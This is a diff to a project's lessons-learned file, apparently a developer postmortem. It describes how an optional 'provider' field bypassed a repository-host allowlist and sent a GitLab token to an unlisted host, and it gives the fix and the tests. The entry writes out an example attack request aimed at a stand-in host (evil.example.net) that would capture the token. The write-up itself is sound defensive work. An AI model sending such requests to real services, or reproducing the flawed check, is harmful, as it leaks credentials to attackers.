@@ -21,6 +21,34 @@ _Nothing yet._
 
 ## What Doesn't Work
 
+### 2026-09-23 — an optional "disambiguation" field turned into an authorisation bypass
+
+**Symptom:** `parseRepoUrl` rejects an unknown forge host — unless the request
+body names a `provider`, which reads like a harmless hint for the case the URL
+cannot settle. It is not. `POST /repos` with
+`{url: 'https://evil.example.net/a/b', provider: 'gitlab'}` was accepted, and
+from then on the GitLab PAT went to that host: as a `PRIVATE-TOKEN` header on
+every `${origin}/api/v4` call, and embedded by `withForgeToken` into
+`https://oauth2:<token>@evil.example.net/a/b.git` for the clone.
+**Cause:** the guard and the escape hatch were written in the same breath. The
+`if (!opts.provider) throw` shape makes the *absence* of a hint the failure
+condition, so supplying one satisfies the check — the host is never validated
+at all. Two review findings circled this (one called it SSRF via `GITLAB_HOST`,
+one called it a misconfiguration risk) and neither named it: the env var is not
+the attacker-controlled input, the request body is.
+**Rule:** a field that selects *among* trusted values must never be able to
+*add* one. Validate the host against the allowlist first and let the hint only
+disambiguate what survives; an unlisted host stays rejected however the request
+is phrased. Applies to any outbound call that carries a credential — ask which
+host ends up receiving the token, not whether the URL parsed. Also reject
+non-http(s) schemes explicitly: `z.string().url()` passes `file:` and `ftp:`,
+and `new URL('file:///x').origin` is the string `'null'`, which flows onward as
+a perfectly ordinary-looking base.
+**Evidence:** `server/src/modules/repos/helpers.ts` → the unknown-host branch ·
+`server/test/repo-url.test.ts` → "rejects an unknown host even when the caller
+names a provider" · `server/test/gitlab.it.test.ts` → `unknown_forge_host` /
+`provider_mismatch`
+
 ### 2026-09-23 — a `..` guard placed after `new URL()` never fires
 
 **Symptom:** widening `parseRepoUrl` from the old two-segment GitHub regex to
